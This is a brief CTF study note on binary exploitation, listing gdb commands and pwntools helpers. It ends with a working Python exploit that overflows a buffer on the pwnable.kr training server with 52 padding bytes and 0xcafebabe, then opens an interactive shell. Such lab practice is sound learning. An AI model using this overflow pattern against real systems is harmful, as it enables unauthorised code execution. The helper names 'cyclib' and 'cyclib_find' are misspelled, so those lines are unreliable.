# CTF note

## PWN


- gdb調用技巧

  - disas main

  - info func
 
  - x $ebp+8

- pwntools
 
  - OFFSET  

    - cyclib(50)
 
    - cyclib_find('aa') 

```python
from pwn import *
context(log_level = 'debug')
playload = 'A'*52 + p32(0xcafebabe)
r = remote('pwnable.kr',9000)
#r.recvuntil('overflow me :')
r.send(playload)
r.interactive()
```
